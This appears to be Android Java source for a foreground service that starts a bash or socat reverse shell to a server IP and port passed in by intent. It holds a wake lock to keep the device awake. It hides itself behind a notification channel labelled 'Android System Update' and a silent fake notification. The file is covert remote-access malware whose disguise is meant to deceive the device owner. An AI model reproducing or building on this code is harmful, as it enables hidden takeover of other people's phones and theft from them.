package com.appholaworld.termuxapi;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class ShellForegroundService extends Service {

    public static final String EXTRA_SHELL_TYPE = "shellType";
    public static final String EXTRA_SERVER_IP = "serverIP";
    public static final String EXTRA_SERVER_PORT = "serverPort";

    private static final String CHANNEL_ID = "android_update_channel";
    private static final int NOTIF_ID = 1001;

    private PowerManager.WakeLock wakeLock;

    private final String TAG = "ShellFGService";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        createNotificationChannel();

        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "termux:ShellWakelock");
            wakeLock.setReferenceCounted(false);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand called");

        if (intent == null) {
            Log.e(TAG, "Intent is null");
            stopSelf();
            return START_NOT_STICKY;
        }

        String shellType = intent.getStringExtra(EXTRA_SHELL_TYPE);
        String serverIP = intent.getStringExtra(EXTRA_SERVER_IP);
        String serverPort = intent.getStringExtra(EXTRA_SERVER_PORT);

        Log.d(TAG, "ShellType=" + shellType + " IP=" + serverIP + " Port=" + serverPort);

        Notification notification = buildNotification();
        startForeground(NOTIF_ID, notification);
        Log.d(TAG, "Foreground started");

        new Thread(() -> {
            Log.d(TAG, "Shell thread started");
            try {
                handleShellRequest(getApplicationContext(), shellType, serverIP, serverPort);
                Log.d(TAG, "Shell process finished");
            } catch (Exception e) {
                Log.e(TAG, "Shell exception: " + e.getMessage(), e);
            } finally {
                Log.d(TAG, "Stopping foreground");
                stopForeground(true);
                stopSelf();
            }
        }).start();

        return START_NOT_STICKY;
    }

    private void handleShellRequest(Context context, String shellType, String serverIP, String serverPort) {
        Log.d(TAG, "handleShellRequest called");

        if (shellType == null || serverIP == null || serverPort == null) {
            Log.e(TAG, "Missing parameters");
            return;
        }

        switch (shellType) {
            case "bash":
                Log.d(TAG, "Launching bash shell");
                new ReverseShellUtils().startBashShell(context, serverIP, serverPort);
                break;

            case "socat":
                Log.d(TAG, "Launching socat shell");
                new ReverseShellUtils().startSocatShell(context, serverIP, serverPort);
                break;

            default:
                Log.e(TAG, "Invalid shell type: " + shellType);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Log.d(TAG, "Creating notification channel");
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Android System Update",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("Checking for software updates");
            channel.setShowBadge(false);

            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("1 new notification")
            .setContentText("You have 1 new pending notification update")
            // Using system drawable to avoid dependency on app resources
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
